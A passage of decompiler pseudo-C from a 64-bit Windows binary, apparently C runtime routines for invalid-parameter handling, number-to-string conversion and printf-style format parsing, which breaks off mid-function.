
  v0 = 0i64;
  v1 = 3i64;
  dword_13F1C6050 = 512;
  qword_13F1C6058 = sub_13F16E6BC(0x200ui64, 8ui64);
  sub_13F16E734(0i64);
  v2 = 0i64;
  v3 = qword_13F1B7308;
  v4 = qword_13F1B72F0;
  do
  {
    sub_13F16EBCC((__int64)(v4 + 6), 0xFA0u, 0);
    *(_QWORD *)(v2 + 3981808) = v4;
    if ( *(_QWORD *)(qword_13F1C6400[v0 >> 6] + ((unsigned __int64)(v0 & 0x3F) << 6) + 40) >= 0xFFFFFFFFFFFFFFFEui64
      || *(_QWORD *)(qword_13F1C6400[v0 >> 6] + ((unsigned __int64)(v0 & 0x3F) << 6) + 40) == 0i64 )
    {
      *(_DWORD *)v3 = -2;
    }
    ++v0;
    v4 += 11;
    v2 += 8i64;
    v3 += 11;
    --v1;
  }
  while ( v1 );
  return 0i64;
}
// 13F167F2A: write access to const memory at 13F1C6050 has been detected
// 13F167F37: write access to const memory at 13F1C6058 has been detected
// 13F167F51: write access to const memory at 13F1C6050 has been detected
// 13F167F61: write access to const memory at 13F1C6058 has been detected
// 13F167EEC: using guessed type __int64 __fastcall sub_13F167EEC();
// 13F1B72F0: using guessed type __int64 qword_13F1B72F0[2];
// 13F1B7308: using guessed type __int64 qword_13F1B7308[3];
// 13F1C6050: using guessed type int dword_13F1C6050;
// 13F1C6058: using guessed type __int64 qword_13F1C6058;
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];

//----- (000000013F16800C) ----------------------------------------------------
__int64 *__fastcall sub_13F16800C(unsigned int a1)
{
  return &qword_13F1B72F0[11 * a1];
}
// 13F1B72F0: using guessed type __int64 qword_13F1B72F0[2];

//----- (000000013F168020) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void sub_13F168020()
{
  __int64 i; // rbx

  sub_13F16D790();
  sub_13F16EEA0();
  for ( i = 0i64; i != 24; i += 8i64 )
  {
    sub_13F16EF54(*(_QWORD *)(i + 3981808));
    MEMORY[0x771B38F0](*(_QWORD *)(i + 3981808) + 48i64);
  }
  sub_13F16E734(3981808i64);
  qword_13F1C6058 = 0i64;
}
// 13F16806D: write access to const memory at 13F1C6058 has been detected
// 13F1C6058: using guessed type __int64 qword_13F1C6058;

//----- (000000013F16807C) ----------------------------------------------------
void sub_13F16807C()
{
  JUMPOUT(0x771DD7F0i64);
}
// 13F168080: control flows out of bounds to 771DD7F0

//----- (000000013F168088) ----------------------------------------------------
void sub_13F168088()
{
  JUMPOUT(0x771DD830i64);
}
// 13F16808C: control flows out of bounds to 771DD830

//----- (000000013F168094) ----------------------------------------------------
void __fastcall sub_13F168094(int a1, int a2, int a3)
{
  __int64 v6; // r14
  __int64 v7; // rax
  int v8; // edi
  __int64 v9; // [rsp+40h] [rbp-C0h] BYREF
  __int64 v10[2]; // [rsp+48h] [rbp-B8h] BYREF
  char v11[8]; // [rsp+58h] [rbp-A8h] BYREF
  char v12[16]; // [rsp+60h] [rbp-A0h] BYREF
  int v13[4]; // [rsp+70h] [rbp-90h] BYREF
  __int64 v14; // [rsp+80h] [rbp-80h]
  char v15[152]; // [rsp+110h] [rbp+10h] BYREF
  __int64 *v16; // [rsp+1A8h] [rbp+A8h]
  __int64 v17; // [rsp+208h] [rbp+108h]
  __int64 retaddr; // [rsp+608h] [rbp+508h]
  __int64 v19; // [rsp+610h] [rbp+510h] BYREF

  if ( a1 != -1 )
    sub_13F1411D0();
  sub_13F15EF70((__int64)v13, 0, 0x98ui64);
  sub_13F15EF70((__int64)v15, 0, 0x4D0ui64);
  v10[0] = (__int64)v13;
  v10[1] = (__int64)v15;
  MEMORY[0x76FBBB90](v15);
  v6 = v17;
  v7 = MEMORY[0x76FBBAB0](v17, &v9, 0i64);
  if ( v7 )
    MEMORY[0x76FBBA50](0i64, v9, v6, v7, v15, v11, v12, 0i64);
  v17 = retaddr;
  v13[0] = a2;
  v16 = &v19;
  v14 = retaddr;
  v13[1] = a3;
  v8 = MEMORY[0x76F77910]();
  MEMORY[0x76F89020](0i64);
  if ( !(unsigned int)MEMORY[0x7700BAB0](v10) && !v8 && a1 != -1 )
    sub_13F1411D0();
}
// 13F168094: using guessed type char var_5A0[16];
// 13F168094: using guessed type char var_5A8[8];

//----- (000000013F1681F0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void __fastcall sub_13F1681F0(__int64 a1)
{
  qword_13F1C6060 = a1;
}
// 13F1681F0: write access to const memory at 13F1C6060 has been detected
// 13F1C6060: using guessed type __int64 qword_13F1C6060;

//----- (000000013F1681F8) ----------------------------------------------------
__int64 __fastcall sub_13F1681F8(__int64 a1, __int64 a2, __int64 a3, unsigned int a4, __int64 a5)
{
  __int64 v9; // rax
  __int64 (__fastcall *v10)(__int64, __int64, __int64, _QWORD); // rbx

  v9 = sub_13F16E5BC();
  if ( !v9 || (v10 = *(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD))(v9 + 952)) == 0i64 )
  {
    v10 = (__int64 (__fastcall *)(__int64, __int64, __int64, _QWORD))__ROR8__(
                                                                       _security_cookie ^ 0x2CC5EF7154DEi64,
                                                                       _security_cookie & 0x3F);
    if ( !v10 )
    {
      sub_13F1682F0();
      JUMPOUT(0x13F16829Ei64);
    }
  }
  return v10(a1, a2, a3, a4);
}
// 13F168299: control flows out of bounds to 13F16829E
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);
// 13F1C6060: using guessed type __int64 qword_13F1C6060;

//----- (000000013F1682A0) ----------------------------------------------------
__int64 sub_13F1682A0()
{
  return sub_13F1681F8(0i64, 0i64, 0i64, 0, 0i64);
}

//----- (000000013F1682C0) ----------------------------------------------------
void __noreturn sub_13F1682C0()
{
  sub_13F1681F8(0i64, 0i64, 0i64, 0, 0i64);
  sub_13F1682F0();
  JUMPOUT(0x13F1682EEi64);
}
// 13F1682E9: control flows out of bounds to 13F1682EE

//----- (000000013F1682F0) ----------------------------------------------------
void sub_13F1682F0()
{
  if ( (unsigned int)sub_13F178220(23i64) )
    __fastfail(5u);
  sub_13F168094(2, -1073740777, 1);
  MEMORY[0x76F85190]();
  JUMPOUT(0x76FBC140i64);
}
// 13F16832F: control flows out of bounds to 76FBC140
// 13F178220: using guessed type __int64 __fastcall sub_13F178220(_QWORD);

//----- (000000013F168338) ----------------------------------------------------
__int64 __fastcall sub_13F168338(__int64 a1, _BYTE *a2, unsigned __int64 a3, __int64 a4, __int128 *a5, __int64 a6)
{
  int v11; // eax
  unsigned __int64 v12; // rbx
  __int64 v13; // rax
  __int64 v14[2]; // [rsp+30h] [rbp-D0h] BYREF
  __int64 v15; // [rsp+40h] [rbp-C0h]
  char v16; // [rsp+48h] [rbp-B8h]
  __int64 *v17; // [rsp+50h] [rbp-B0h] BYREF
  __int64 v18; // [rsp+58h] [rbp-A8h] BYREF
  char v19[32]; // [rsp+60h] [rbp-A0h] BYREF
  char v20[1120]; // [rsp+80h] [rbp-80h] BYREF
  __int64 v21; // [rsp+4E0h] [rbp+3E0h]

  if ( !a4 || a3 && !a2 )
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
    return 0xFFFFFFFFi64;
  }
  sub_13F1687CC((__int64)&v18, a5);
  sub_13F15EF70((__int64)v14, 0, 0x20ui64);
  v15 = 0i64;
  v14[0] = (__int64)a2;
  v14[1] = a3;
  if ( (a1 & 2) != 0 || (v16 = 0, !a2) )
    v16 = 1;
  v17 = v14;
  sub_13F168750((__int64)v20, &v17, a1, a4, (__int64)v19, a6);
  v11 = sub_13F168950((__int64)v20);
  v12 = v11;
  if ( !a2 )
    goto LABEL_22;
  if ( (a1 & 1) == 0 )
  {
    if ( (a1 & 2) != 0 )
    {
      if ( !a3 )
        goto LABEL_22;
      if ( v11 < 0 )
      {
        *a2 = 0;
        goto LABEL_22;
      }
      v13 = v15;
      if ( v15 != a3 )
      {
LABEL_21:
        a2[v13] = 0;
        goto LABEL_22;
      }
    }
    else
    {
      if ( !a3 )
      {
LABEL_26:
        LODWORD(v12) = -1;
        goto LABEL_22;
      }
      v13 = v15;
      if ( v15 != a3 )
        goto LABEL_21;
      LODWORD(v12) = -2;
    }
    a2[a3 - 1] = 0;
    goto LABEL_22;
  }
  if ( !a3 && v11 )
    goto LABEL_26;
  v13 = v15;
  if ( v15 != a3 )
    goto LABEL_21;
  if ( (v12 & 0x80000000) == 0i64 && v12 > a3 )
    goto LABEL_26;
LABEL_22:
  sub_13F16E734(v21);
  v21 = 0i64;
  if ( v19[16] )
    *(_DWORD *)(v18 + 936) &= ~2u;
  return (unsigned int)v12;
}

//----- (000000013F1684E0) ----------------------------------------------------
char __fastcall sub_13F1684E0(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v4; // rsi
  char v5; // di
  __int64 v6; // rbx

  if ( ((0xFFFFFFFFFFFFFFFFui64 / a2) & 0xFFFFFFFFFFFFFFFEui64) >= 2 )
  {
    v4 = 2 * a2;
    v5 = 0;
    if ( (*(_QWORD *)(a1 + 1032) || v4 > 0x400) && v4 > *(_QWORD *)(a1 + 1024) )
    {
      v6 = sub_13F16F1F8(v4);
      if ( v6 )
      {
        sub_13F16E734(*(_QWORD *)(a1 + 1032));
        *(_QWORD *)(a1 + 1032) = v6;
        v5 = 1;
        *(_QWORD *)(a1 + 1024) = v4;
      }
      sub_13F16E734(0i64);
      return v5;
    }
    else
    {
      return 1;
    }
  }
  else
  {
    *(_DWORD *)sub_13F169DAC() = 12;
    return 0;
  }
}

//----- (000000013F16858C) ----------------------------------------------------
bool __fastcall sub_13F16858C(__int64 a1, char a2, int a3)
{
  if ( a3 != 2 )
  {
    if ( a3 == 3 || a3 == 12 )
      return 1;
    if ( a3 != 13 )
      return ((a2 - 99) & 0xEF) != 0;
  }
  return 0;
}

//----- (000000013F1685BC) ----------------------------------------------------
__int64 __fastcall sub_13F1685BC(__int64 a1, unsigned int a2, unsigned int a3, char a4)
{
  __int64 v4; // rax
  __int64 v6; // rcx
  __int64 v9; // rax
  __int64 v10; // r8
  __int64 result; // rax
  char v12; // dl
  int v13; // er8

  v4 = a1 + 88;
  v6 = *(_QWORD *)(a1 + 1120);
  if ( !v6 )
    v6 = v4;
  if ( *(_QWORD *)(v4 + 1032) )
    v9 = *(_QWORD *)(v4 + 1024) >> 1;
  else
    v9 = 512i64;
  v10 = v9 + v6 - 1;
  for ( *(_QWORD *)(a1 + 72) = v10; ; --*(_QWORD *)(a1 + 72) )
  {
    result = *(unsigned int *)(a1 + 56);
    if ( (int)result <= 0 && !a2 )
      break;
    *(_DWORD *)(a1 + 56) = result - 1;
    v12 = a2 % a3 + 48;
    a2 /= a3;
    if ( v12 > 57 )
      v12 += a4 != 0 ? 7 : 39;
    **(_BYTE **)(a1 + 72) = v12;
  }
  v13 = v10 - *(_DWORD *)(a1 + 72);
  ++*(_QWORD *)(a1 + 72);
  *(_DWORD *)(a1 + 80) = v13;
  return result;
}

//----- (000000013F168658) ----------------------------------------------------
__int64 __fastcall sub_13F168658(__int64 a1, unsigned __int64 a2, unsigned int a3, char a4)
{
  __int64 v4; // rax
  unsigned __int64 v5; // rbx
  __int64 v8; // rcx
  __int64 v9; // rax
  __int64 v10; // r8
  __int64 result; // rax
  char v12; // dl
  int v13; // er8

  v4 = a1 + 88;
  v5 = a3;
  v8 = *(_QWORD *)(a1 + 1120);
  if ( !v8 )
    v8 = v4;
  if ( *(_QWORD *)(v4 + 1032) )
    v9 = *(_QWORD *)(v4 + 1024) >> 1;
  else
    v9 = 512i64;
  v10 = v9 + v8 - 1;
  for ( *(_QWORD *)(a1 + 72) = v10; ; --*(_QWORD *)(a1 + 72) )
  {
    result = *(unsigned int *)(a1 + 56);
    if ( (int)result <= 0 && !a2 )
      break;
    *(_DWORD *)(a1 + 56) = result - 1;
    v12 = a2 % v5 + 48;
    a2 /= v5;
    if ( v12 > 57 )
      v12 += a4 != 0 ? 7 : 39;
    **(_BYTE **)(a1 + 72) = v12;
  }
  v13 = v10 - *(_DWORD *)(a1 + 72);
  ++*(_QWORD *)(a1 + 72);
  *(_DWORD *)(a1 + 80) = v13;
  return result;
}

//----- (000000013F1686F4) ----------------------------------------------------
__int64 __fastcall sub_13F1686F4(__int64 *a1, char a2, int a3, _DWORD *a4)
{
  int i; // er11
  __int64 result; // rax

  for ( i = 0; i < a3; ++i )
  {
    result = *(_QWORD *)(*a1 + 8);
    if ( *(_QWORD *)(*a1 + 16) == result )
    {
      if ( *(_BYTE *)(*a1 + 24) )
        ++*a4;
      else
        *a4 = -1;
    }
    else
    {
      ++*a4;
      ++*(_QWORD *)(*a1 + 16);
      **(_BYTE **)*a1 = a2;
      result = *a1;
      ++*(_QWORD *)*a1;
    }
    if ( *a4 == -1 )
      break;
  }
  return result;
}

//----- (000000013F168750) ----------------------------------------------------
__int64 __fastcall sub_13F168750(__int64 a1, _QWORD *a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  *(_QWORD *)a1 = 0i64;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 24) = 0i64;
  *(_QWORD *)(a1 + 32) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)(a1 + 40) = 0i64;
  *(_QWORD *)(a1 + 48) = 0i64;
  *(_DWORD *)(a1 + 56) = 0;
  *(_WORD *)(a1 + 64) = 0;
  *(_DWORD *)(a1 + 80) = 0;
  *(_BYTE *)(a1 + 84) = 0;
  *(_QWORD *)(a1 + 1112) = 0i64;
  *(_QWORD *)(a1 + 1120) = 0i64;
  *(_QWORD *)(a1 + 1128) = *a2;
  *(_QWORD *)(a1 + 8) = a5;
  *(_QWORD *)(a1 + 32) = a6;
  *(_QWORD *)a1 = a3;
  *(_QWORD *)(a1 + 24) = a4;
  *(_DWORD *)(a1 + 1136) = 0;
  *(_QWORD *)(a1 + 16) = sub_13F169DAC();
  return a1;
}

//----- (000000013F1687CC) ----------------------------------------------------
__int64 __fastcall sub_13F1687CC(__int64 a1, __int128 *a2)
{
  __int128 v2; // xmm0

  *(_BYTE *)(a1 + 24) = 0;
  if ( a2 )
    v2 = *a2;
  else
    v2 = xmmword_13F1B7608;
  *(_OWORD *)(a1 + 8) = v2;
  return a1;
}
// 13F1B7608: using guessed type __int128 xmmword_13F1B7608;
// 13F1C6238: using guessed type int dword_13F1C6238;

//----- (000000013F16885C) ----------------------------------------------------
char __fastcall sub_13F16885C(char *a1, __int64 a2)
{
  char *v2; // rbx
  char v4; // dl
  char *v5; // rbx
  char v6; // al
  char result; // al

  v2 = a1;
  if ( (unsigned int)sub_13F16A580(*a1) != 101 )
  {
    do
      ++v2;
    while ( (unsigned int)sub_13F16A37C((unsigned __int8)*v2) );
  }
  if ( (unsigned int)sub_13F16A580(*v2) == 120 )
    v2 += 2;
  v4 = *v2;
  *v2 = ***(_BYTE ***)(*(_QWORD *)a2 + 248i64);
  v5 = v2 + 1;
  do
  {
    v6 = *v5;
    *v5 = v4;
    v4 = v6;
    result = *v5++;
  }
  while ( result );
  return result;
}

//----- (000000013F1688CC) ----------------------------------------------------
char __fastcall sub_13F1688CC(__int64 a1, _DWORD *a2)
{
  int *v2; // rsi
  char v4; // bp
  int v5; // er14
  __int64 v6; // rcx
  unsigned __int64 v8; // [rsp+40h] [rbp+8h] BYREF

  v2 = *(int **)(a1 + 16);
  v4 = 1;
  v5 = *v2;
  *v2 = 0;
  v6 = *(_QWORD *)(a1 + 24);
  v8 = 0i64;
  *a2 = sub_13F16F258(v6 - 1, &v8, 0xAu);
  if ( **(_DWORD **)(a1 + 16) == 34 || v8 < *(_QWORD *)(a1 + 24) )
    v4 = 0;
  else
    *(_QWORD *)(a1 + 24) = v8;
  if ( !*v2 && v5 )
    *v2 = v5;
  return v4;
}

//----- (000000013F168950) ----------------------------------------------------
__int64 __fastcall sub_13F168950(__int64 a1)
{
  int v3; // ecx
  int v4; // ecx
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  int v9; // ecx
  int v10; // ecx
  char v11; // al
  _DWORD *v12; // rdx
  int v13; // ecx
  int v14; // ecx
  char v15; // al
  char *v16; // rax
  char v17; // cl

  if ( !*(_QWORD *)(a1 + 1128) || !*(_QWORD *)(a1 + 24) )
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
    return 0xFFFFFFFFi64;
  }
  if ( ++*(_DWORD *)(a1 + 1136) == 2 )
    return *(unsigned int *)(a1 + 40);
  while ( 2 )
  {
    *(_DWORD *)(a1 + 80) = 0;
    *(_DWORD *)(a1 + 44) = 0;
    while ( 1 )
    {
      v16 = *(char **)(a1 + 24);
      v17 = *v16;
      *(_BYTE *)(a1 + 65) = *v16;
      if ( !v17 )
        break;
      ++*(_QWORD *)(a1 + 24);
      if ( *(int *)(a1 + 40) < 0 )
        goto LABEL_48;
      if ( (unsigned __int8)(*(_BYTE *)(a1 + 65) - 32) > 0x5Au )
        v3 = 0;
      else
        v3 = *((_BYTE *)&qword_13F18D7B0[-4] + *(char *)(a1 + 65)) & 0xF;
      v4 = *((unsigned __int8 *)qword_13F18D7B0 + (unsigned int)(*(_DWORD *)(a1 + 44) + 8 * v3 + v3)) >> 4;
      *(_DWORD *)(a1 + 44) = v4;
      if ( v4 == 8 )
        goto LABEL_52;
      if ( !v4 )
      {
        v11 = sub_13F168D68(a1);
        goto LABEL_45;
      }
      v5 = v4 - 1;
      if ( v5 )
      {
        v6 = v5 - 1;
        if ( v6 )
        {
          v7 = v6 - 1;
          if ( v7 )
          {
            v8 = v7 - 1;
            if ( v8 )
            {
              v9 = v8 - 1;
              if ( v9 )
              {
                v10 = v9 - 1;
                if ( v10 )
                {
                  if ( v10 != 1 )
                    return 0xFFFFFFFFi64;
                  v11 = sub_13F168FF0(a1);
                }
                else
                {
                  v11 = sub_13F168E74(a1);
                }
                goto LABEL_45;
              }
              if ( *(_BYTE *)(a1 + 65) == 42 )
              {
                *(_QWORD *)(a1 + 32) += 8i64;
                v13 = *(_DWORD *)(*(_QWORD *)(a1 + 32) - 8i64);
                if ( v13 < 0 )
                  v13 = -1;
                *(_DWORD *)(a1 + 56) = v13;
LABEL_32:
                v11 = 1;
                goto LABEL_45;
              }
              v12 = (_DWORD *)(a1 + 56);
              goto LABEL_23;
            }
            *(_DWORD *)(a1 + 56) = 0;
          }
          else
          {
            if ( *(_BYTE *)(a1 + 65) == 42 )
            {
              *(_QWORD *)(a1 + 32) += 8i64;
              v14 = *(_DWORD *)(*(_QWORD *)(a1 + 32) - 8i64);
              *(_DWORD *)(a1 + 52) = v14;
              if ( v14 < 0 )
              {
                *(_DWORD *)(a1 + 48) |= 4u;
                *(_DWORD *)(a1 + 52) = -v14;
              }
              goto LABEL_32;
            }
            v12 = (_DWORD *)(a1 + 52);
LABEL_23:
            v11 = sub_13F1688CC(a1, v12);
LABEL_45:
            if ( !v11 )
              return 0xFFFFFFFFi64;
          }
        }
        else
        {
          v15 = *(_BYTE *)(a1 + 65);
          switch ( v15 )
          {
            case ' ':
              *(_DWORD *)(a1 + 48) |= 2u;
              break;
            case '#':
              *(_DWORD *)(a1 + 48) |= 0x20u;
              break;
            case '+':
              *(_DWORD *)(a1 + 48) |= 1u;
              break;
            case '-':
              *(_DWORD *)(a1 + 48) |= 4u;
              break;
            case '0':
              *(_DWORD *)(a1 + 48) |= 8u;
              break;
          }
        }
      }
      else
      {
        *(_QWORD *)(a1 + 48) = 0i64;
        *(_BYTE *)(a1 + 64) = 0;
        *(_DWORD *)(a1 + 56) = -1;
        *(_DWORD *)(a1 + 60) = 0;
        *(_BYTE *)(a1 + 84) = 0;
      }
    }
    ++*(_QWORD *)(a1 + 24);
LABEL_48:
    if ( *(_DWORD *)(a1 + 44) && *(_DWORD *)(a1 + 44) != 7 )
    {
LABEL_52:
      *(_DWORD *)sub_13F169DAC() = 22;
      sub_13F1682A0();
      return 0xFFFFFFFFi64;
    }
    if ( ++*(_DWORD *)(a1 + 1136) != 2 )
      continue;
    return *(unsigned int *)(a1 + 40);
  }
}
// 13F18D7B0: using guessed type __int64 qword_13F18D7B0[8];

//----- (000000013F168B64) ----------------------------------------------------
__int64 __fastcall sub_13F168B64(__int64 a1)
{
  int v3; // ecx
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  char v11; // al
  _DWORD *v12; // rdx
  int v13; // ecx
  int v14; // ecx
  char v15; // al
  char *v16; // rax
  char v17; // cl

  if ( !*(_QWORD *)(a1 + 1128) || !*(_QWORD *)(a1 + 24) )
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
    return 0xFFFFFFFFi64;
  }
  if ( ++*(_DWORD *)(a1 + 1136) == 2 )
    return *(unsigned int *)(a1 + 40);
  while ( 2 )
  {
    *(_DWORD *)(a1 + 80) = 0;
    *(_DWORD *)(a1 + 44) = 0;
    while ( 1 )
    {
      v16 = *(char **)(a1 + 24);
      v17 = *v16;
      *(_BYTE *)(a1 + 65) = *v16;
      if ( !v17 )
        break;
      ++*(_QWORD *)(a1 + 24);
      if ( *(int *)(a1 + 40) < 0 )
        goto LABEL_48;
      if ( (unsigned __int8)(*(_BYTE *)(a1 + 65) - 32) > 0x5Au )
        v3 = 0;
      else
        v3 = *((_BYTE *)&qword_13F18D750[-4] + *(char *)(a1 + 65)) & 0xF;
      v4 = *((unsigned __int8 *)qword_13F18D750 + (unsigned int)(*(_DWORD *)(a1 + 44) + 8 * v3)) >> 4;
      *(_DWORD *)(a1 + 44) = v4;
      if ( v4 == 8 )
      {
        *(_DWORD *)sub_13F169DAC() = 22;
        sub_13F1682A0();
        return 0xFFFFFFFFi64;
      }
      if ( !v4 )
      {
        v11 = sub_13F168D68(a1);
        goto LABEL_45;
      }
      v5 = v4 - 1;
      if ( v5 )
      {
        v6 = v5 - 1;
        if ( v6 )
        {
          v7 = v6 - 1;
          if ( v7 )
          {
            v8 = v7 - 1;
            if ( v8 )
            {
              v9 = v8 - 1;
              if ( v9 )
              {
                v10 = v9 - 1;
                if ( v10 )
                {
                  if ( v10 != 1 )
                    return 0xFFFFFFFFi64;
                  v11 = sub_13F168FF0(a1);
                }
                else
                {
                  v11 = sub_13F168E74(a1);
                }
                goto LABEL_45;
              }
              if ( *(_BYTE *)(a1 + 65) == 42 )
              {
                *(_QWORD *)(a1 + 32) += 8i64;
                v13 = *(_DWORD *)(*(_QWORD *)(a1 + 32) - 8i64);
                if ( v13 < 0 )
                  v13 = -1;
                *(_DWORD *)(a1 + 56) = v13;
LABEL_32:
                v11 = 1;
                goto LABEL_45;
              }
              v12 = (_DWORD *)(a1 + 56);
              goto LABEL_23;
            }
            *(_DWORD *)(a1 + 56) = 0;
          }
          else
          {
            if ( *(_BYTE *)(a1 + 65) == 42 )
            {
              *(_QWORD *)(a1 + 32) += 8i64;
              v14 = *(_DWORD *)(*(_QWORD *)(a1 + 32) - 8i64);
              *(_DWORD *)(a1 + 52) = v14;
              if ( v14 < 0 )
              {
                *(_DWORD *)(a1 + 48) |= 4u;
                *(_DWORD *)(a1 + 52) = -v14;
              }
              goto LABEL_32;
            }
            v12 = (_DWORD *)(a1 + 52);
LABEL_23:
            v11 = sub_13F1688CC(a1, v12);
LABEL_45:
            if ( !v11 )
              return 0xFFFFFFFFi64;
          }
        }
        else
        {
          v15 = *(_BYTE *)(a1 + 65);
          switch ( v15 )
          {
            case ' ':
              *(_DWORD *)(a1 + 48) |= 2u;
              break;
            case '#':
              *(_DWORD *)(a1 + 48) |= 0x20u;
              break;
            case '+':
              *(_DWORD *)(a1 + 48) |= 1u;
              break;
            case '-':
              *(_DWORD *)(a1 + 48) |= 4u;
              break;
            case '0':
              *(_DWORD *)(a1 + 48) |= 8u;
              break;
          }
        }
      }
      else
      {
        *(_DWORD *)(a1 + 52) = 0;
        *(_DWORD *)(a1 + 48) = 0;
        *(_DWORD *)(a1 + 60) = 0;
        *(_BYTE *)(a1 + 64) = 0;
        *(_DWORD *)(a1 + 56) = -1;
        *(_BYTE *)(a1 + 84) = 0;
      }
    }
    ++*(_QWORD *)(a1 + 24);
LABEL_48:
    if ( ++*(_DWORD *)(a1 + 1136) != 2 )
      continue;
    return *(unsigned int *)(a1 + 40);
  }
}
// 13F18D750: using guessed type __int64 qword_13F18D750[12];

//----- (000000013F168D68) ----------------------------------------------------
char __fastcall sub_13F168D68(__int64 a1)
{
  __int64 v2; // rcx
  char v3; // r8

  if ( sub_13F168DDC(a1) )
  {
    v2 = *(_QWORD *)(a1 + 1128);
    v3 = *(_BYTE *)(a1 + 65);
    if ( *(_QWORD *)(v2 + 16) == *(_QWORD *)(v2 + 8) )
    {
      if ( *(_BYTE *)(v2 + 24) )
        ++*(_DWORD *)(a1 + 40);
      else
        *(_DWORD *)(a1 + 40) = -1;
    }
    else
    {
      ++*(_DWORD *)(a1 + 40);
      ++*(_QWORD *)(v2 + 16);
      *(_BYTE *)(**(_QWORD **)(a1 + 1128))++ = v3;
    }
    return 1;
  }
  else
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
    return 0;
  }
}

//----- (000000013F168DDC) ----------------------------------------------------
char __fastcall sub_13F168DDC(__int64 a1)
{
  _QWORD **v1; // rax
  __int64 v3; // r8
  __int64 v4; // rcx
  char *v5; // rax
  char v6; // cl

  v1 = *(_QWORD ***)(a1 + 8);
  v3 = *(unsigned __int8 *)(a1 + 65);
  *(_BYTE *)(a1 + 84) = 0;
  if ( *(__int16 *)(**v1 + 2 * v3) >= 0 )
    return 1;
  v4 = *(_QWORD *)(a1 + 1128);
  if ( *(_QWORD *)(v4 + 16) == *(_QWORD *)(v4 + 8) )
  {
    if ( *(_BYTE *)(v4 + 24) )
      ++*(_DWORD *)(a1 + 40);
    else
      *(_DWORD *)(a1 + 40) = -1;
  }
  else
  {
    ++*(_DWORD *)(a1 + 40);
    ++*(_QWORD *)(v4 + 16);
    *(_BYTE *)(**(_QWORD **)(a1 + 1128))++ = v3;
  }
  v5 = *(char **)(a1 + 24);
  v6 = *v5;
  *(_BYTE *)(a1 + 65) = *v5;
  *(_QWORD *)(a1 + 24) = v5 + 1;
  if ( v6 )
    return 1;
  *(_DWORD *)sub_13F169DAC() = 22;
  sub_13F1682A0();
  return 0;
}

//----- (000000013F168E74) ----------------------------------------------------
char __fastcall sub_13F168E74(__int64 a1)
{
  char v1; // al
  char result; // al
  bool v3; // zf
  _BYTE *v4; // rax
  _BYTE *v5; // rax
  char *v6; // rdx
  char v7; // al
  unsigned __int8 v8; // al
  __int64 v9; // rdx

  v1 = *(_BYTE *)(a1 + 65);
  if ( v1 == 70 )
  {
    if ( (*(_BYTE *)a1 & 8) == 0 )
    {
      *(_DWORD *)(a1 + 44) = 7;
      return sub_13F168FF0(a1);
    }
    return 1;
  }
  if ( v1 == 78 )
  {
    if ( (*(_BYTE *)a1 & 8) == 0 )
    {
      *(_DWORD *)(a1 + 44) = 8;
LABEL_7:
      *(_DWORD *)sub_13F169DAC() = 22;
      sub_13F1682A0();
      return 0;
    }
    return 1;
  }
  if ( *(_DWORD *)(a1 + 60) )
    goto LABEL_7;
  switch ( v1 )
  {
    case 'I':
      v6 = *(char **)(a1 + 24);
      v7 = *v6;
      if ( *v6 == 51 && v6[1] == 50 )
      {
        *(_DWORD *)(a1 + 60) = 10;
        *(_QWORD *)(a1 + 24) = v6 + 2;
      }
      else if ( v7 == 54 && v6[1] == 52 )
      {
        *(_DWORD *)(a1 + 60) = 11;
        *(_QWORD *)(a1 + 24) = v6 + 2;
      }
      else
      {
        v8 = v7 - 88;
        if ( v8 <= 0x20u )
        {
          v9 = 0x120821001i64;
          if ( _bittest64(&v9, (char)v8) )
            *(_DWORD *)(a1 + 60) = 9;
        }
      }
      return 1;
    case 'L':
      *(_DWORD *)(a1 + 60) = 8;
      return 1;
    case 'T':
      *(_DWORD *)(a1 + 60) = 13;
      return 1;
    case 'h':
      v5 = *(_BYTE **)(a1 + 24);
      if ( *v5 == 104 )
      {
        *(_DWORD *)(a1 + 60) = 1;
        *(_QWORD *)(a1 + 24) = v5 + 1;
      }
      else
      {
        *(_DWORD *)(a1 + 60) = 2;
      }
      return 1;
    case 'j':
      *(_DWORD *)(a1 + 60) = 5;
      return 1;
    case 'l':
      v4 = *(_BYTE **)(a1 + 24);
      if ( *v4 == 108 )
      {
        *(_DWORD *)(a1 + 60) = 4;
        *(_QWORD *)(a1 + 24) = v4 + 1;
      }
      else
      {
        *(_DWORD *)(a1 + 60) = 3;
      }
      return 1;
    case 't':
      *(_DWORD *)(a1 + 60) = 7;
      return 1;
    case 'w':
      *(_DWORD *)(a1 + 60) = 12;
      return 1;
  }
  v3 = v1 == 122;
  result = 1;
  if ( v3 )
    *(_DWORD *)(a1 + 60) = 6;
  return result;
}

//----- (000000013F168FF0) ----------------------------------------------------
char __fastcall sub_13F168FF0(__int64 a1)
{
  int v1; // eax
  __int64 v2; // rbx
  char v3; // al
  unsigned int v4; // edx
  char v5; // r8
  int v6; // ecx
  int v8; // edx
  __int64 v9; // rdi
  char v10; // cl
  bool v11; // r8
  bool v12; // al
  int v13; // esi
  int v14; // ecx
  __m128i v15; // [rsp+50h] [rbp+8h] BYREF

  v1 = *(char *)(a1 + 65);
  v2 = a1;
  if ( v1 > 100 )
  {
    if ( v1 <= 103 )
      goto LABEL_34;
    if ( v1 != 105 )
    {
      switch ( v1 )
      {
        case 'n':
          v3 = sub_13F16975C(a1);
          goto LABEL_35;
        case 'o':
          v6 = *(_DWORD *)(a1 + 48);
          if ( (v6 & 0x20) != 0 )
            *(_DWORD *)(v2 + 48) = v6 | 0x80;
          v4 = 8;
          a1 = v2;
          goto LABEL_32;
        case 'p':
